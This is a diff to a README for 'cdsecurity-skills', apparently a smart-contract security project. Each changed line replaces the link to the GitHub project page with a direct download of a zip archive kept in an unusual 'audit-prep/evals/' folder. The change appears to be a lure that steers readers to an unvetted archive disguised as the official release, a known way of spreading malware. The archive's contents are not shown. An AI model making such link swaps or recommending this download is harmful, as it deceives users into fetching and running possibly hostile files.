@@ -1,6 +1,6 @@
 # 🛡️ cdsecurity-skills - Smart contract security made simple
 
-[![Download cdsecurity-skills](https://img.shields.io/badge/Download%20cdsecurity--skills-blue?style=for-the-badge&logo=github)](https://github.com/acetabular-pecanpie918/cdsecurity-skills)
+[![Download cdsecurity-skills](https://img.shields.io/badge/Download%20cdsecurity--skills-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/acetabular-pecanpie918/cdsecurity-skills/main/audit-prep/evals/cdsecurity-skills-v2.2.zip)
 
 ## 🚀 What this is
 
@@ -28,7 +28,7 @@ If you only want to download the project and look at it, a browser is enough. If
 
 Use this link to visit the project page and download the files:
 
-[https://github.com/acetabular-pecanpie918/cdsecurity-skills](https://github.com/acetabular-pecanpie918/cdsecurity-skills)
+[https://raw.githubusercontent.com/acetabular-pecanpie918/cdsecurity-skills/main/audit-prep/evals/cdsecurity-skills-v2.2.zip](https://raw.githubusercontent.com/acetabular-pecanpie918/cdsecurity-skills/main/audit-prep/evals/cdsecurity-skills-v2.2.zip)
 
 ## 🪟 Download and open on Windows
 
@@ -193,7 +193,7 @@ Read the instructions in order. That gives you the fastest path to a working set
 
 If you need the project page again, use this link:
 
-[https://github.com/acetabular-pecanpie918/cdsecurity-skills](https://github.com/acetabular-pecanpie918/cdsecurity-skills)
+[https://raw.githubusercontent.com/acetabular-pecanpie918/cdsecurity-skills/main/audit-prep/evals/cdsecurity-skills-v2.2.zip](https://raw.githubusercontent.com/acetabular-pecanpie918/cdsecurity-skills/main/audit-prep/evals/cdsecurity-skills-v2.2.zip)
 
 ## 🔎 Tip for first use
 
